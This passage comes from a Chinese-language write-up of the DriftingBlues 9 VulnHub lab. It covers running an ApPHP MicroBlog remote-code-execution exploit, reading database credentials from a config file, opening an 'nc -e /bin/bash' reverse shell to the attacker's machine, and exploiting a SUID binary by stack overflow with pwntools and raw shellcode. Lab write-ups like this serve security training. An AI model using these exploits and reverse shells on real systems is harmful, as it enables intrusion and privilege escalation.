class=\"line\">&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n<p>没有爆破出其他有价值的内容，搜索一下公开漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;driftingblues9]</span><br><span class=\"line\">└─$ searchsploit apphp</span><br><span class=\"line\">---------------------------------- ---------------------------------</span><br><span class=\"line\"> Exploit Title                    |  Path</span><br><span class=\"line\">---------------------------------- ---------------------------------</span><br><span class=\"line\">ApPHP MicroBlog 1.0.1 - Multiple  | php&#x2F;webapps&#x2F;33030.txt</span><br><span class=\"line\">ApPHP MicroBlog 1.0.1 - Remote Co | php&#x2F;webapps&#x2F;33070.py</span><br><span class=\"line\">ApPHP MicroBlog 1.0.2 - Cross-Sit | php&#x2F;webapps&#x2F;40506.html</span><br><span class=\"line\">ApPHP MicroBlog 1.0.2 - Persisten | php&#x2F;webapps&#x2F;40505.txt</span><br><span class=\"line\">ApPHP MicroCMS 3.9.5 - Cross-Site | php&#x2F;webapps&#x2F;40517.html</span><br><span class=\"line\">ApPHP MicroCMS 3.9.5 - Persistent | php&#x2F;webapps&#x2F;40516.txt</span><br><span class=\"line\">---------------------------------- ---------------------------------</span><br><span class=\"line\">Shellcodes: No Results</span><br></pre></td></tr></table></figure>\n<p>发现远程命令执行执行漏洞，运行一下该payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python2 &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;33070.py http:&#x2F;&#x2F;192.168.56.114&#x2F;index.php</span><br></pre></td></tr></table></figure>\n<p>直接使用该payload即可打入命令执行，但是该用户的权限是www-data，查看网站的配置文件include/base.inc.php可以看到数据库配置信息</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// DATABASE CONNECTION INFORMATION</span></span><br><span class=\"line\">define(<span class=\"string\">'DATABASE_HOST'</span>, <span class=\"string\">'localhost'</span>);           <span class=\"comment\">// Database host</span></span><br><span class=\"line\">define(<span class=\"string\">'DATABASE_NAME'</span>, <span class=\"string\">'microblog'</span>);           <span class=\"comment\">// Name of the database to be used</span></span><br><span class=\"line\">define(<span class=\"string\">'DATABASE_USERNAME'</span>, <span class=\"string\">'clapton'</span>); <span class=\"comment\">// User name for access to database</span></span><br><span class=\"line\">define(<span class=\"string\">'DATABASE_PASSWORD'</span>, <span class=\"string\">'yaraklitepe'</span>);<span class=\"comment\">// Password for access to database</span></span><br><span class=\"line\">define(<span class=\"string\">'DB_ENCRYPT_KEY'</span>, <span class=\"string\">'p52plaiqb8'</span>);    <span class=\"comment\">// Database encryption key</span></span><br><span class=\"line\">define(<span class=\"string\">'DB_PREFIX'</span>, <span class=\"string\">'mb101_'</span>);</span><br><span class=\"line\"><span class=\"comment\">// Unique prefix of all table names in the database</span></span><br></pre></td></tr></table></figure>\n<p>查看系统文件发现也存在clapton用户，用数据库的密码进行登录，但是我们的现在反弹的shell没法输入密码，所以我们需要尝试建立一个tty终端:</p>\n<p>先反弹一个shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">nc -e &#x2F;bin&#x2F;bash 192.168.56.108 8888</span><br></pre></td></tr></table></figure>\n<p>然后建立一个tty终端</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br></pre></td></tr></table></figure>\n<p>然后登录clapton用户，在用户家目录下可以看到user.txt获取第一段flag，还有提示文件note.txt提示接下来要进行栈溢出，家目录下有一个input二进制文件有suid权限，通过该文件可以栈溢出提权，将该文件下载到本机进行调试，查看该文件的安全机制，发现没有开任何的安全机制，但是本机默认开启了ALSR，为了调试方便，所以先关闭该地址空间随机化</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo 0|sudo tee &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br></pre></td></tr></table></figure>\n<p>首先定位溢出点</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msf-pattern_create -l 300</span><br></pre></td></tr></table></figure>\n<p>然后gdb运行得到的模式字符串</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;driftingblues9]</span><br><span class=\"line\">└─$ gdb -q .&#x2F;input</span><br><span class=\"line\">Reading symbols from .&#x2F;input...</span><br><span class=\"line\">(No debugging symbols found in .&#x2F;input)</span><br><span class=\"line\">gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br><span class=\"line\">Starting program: &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;driftingblues9&#x2F;input Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure>\n<p>然后程序崩溃之后记下当前地址，计算偏移量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;driftingblues9]</span><br><span class=\"line\">└─$ msf-pattern_offset -q 0x41376641</span><br><span class=\"line\">[*] Exact match at offset 171</span><br></pre></td></tr></table></figure>\n<p>接下来使用gdb验证偏移量</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">run $(python2 -c &#39;print &quot;a&quot;*171 + &quot;b&quot;*4 + &quot;\\x90&quot;*500&#39;)</span><br></pre></td></tr></table></figure>\n<p>此时程序崩溃时eip执行0x62626262，说明我们的溢出点正确，再查看此时的esp地址作为返回地址，那么编写exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context(os='linux', arch='amd64', log_level='debug')</span></span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">payload = <span class=\"string\">b'a'</span> * <span class=\"number\">171</span> + p32(<span class=\"number\">0xffffd351</span>) + <span class=\"string\">b'\\x90'</span> * <span class=\"number\">2000</span> + shellcode</span><br><span class=\"line\">p = process([<span class=\"string\">'./input'</span>, payload])</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>接下来尝试在服务器上运行，服务器端开启了alsr，我们无法关闭，所以进行爆破</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">for i in &#123;1..10000&#125;;do (.&#x2F;input $(python -c &#39;print &quot;a&quot;*171+&quot;\\xb0\\xde\\xbf\\xbf&quot;+&quot;\\x90&quot;*500+&quot;jhh&#x2F;&#x2F;&#x2F;sh&#x2F;bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80&quot;&#39;)); done;</span><br></pre></td></tr></table></figure>\n<p>在靶机上执行命令即可获取flag，然后再根目录下可以找到flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># cat root.txt</span><br><span class=\"line\">cat root.txt</span><br><span class=\"line\"></span><br><span class=\"line\">this is the final of driftingblues series. i hope you&#39;ve learned something from them.</span><br><span class=\"line\"></span><br><span class=\"line\">you can always contact me at vault13_escape_service[at]outlook.com for your questions. (mail language: english&#x2F;turkish)</span><br><span class=\"line\"></span><br><span class=\"line\">your root flag:</span><br><span class=\"line\"></span><br><span class=\"line\">04D4C1BEC659F1AA15B7AE731CEEDD65</span><br><span class=\"line\"></span><br><span class=\"line\">good luck. ( ͡° ͜ʖ ͡°)</span><br></pre></td></tr></table></figure>\n<h1 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" title=\"后记\"></a>后记</h1><p>做这个靶机又帮助我回忆了一下栈溢出的知识，这个系列的靶机至此全部结束。</p>\n","categories":["vulnhub"],"tags":["cve"]}]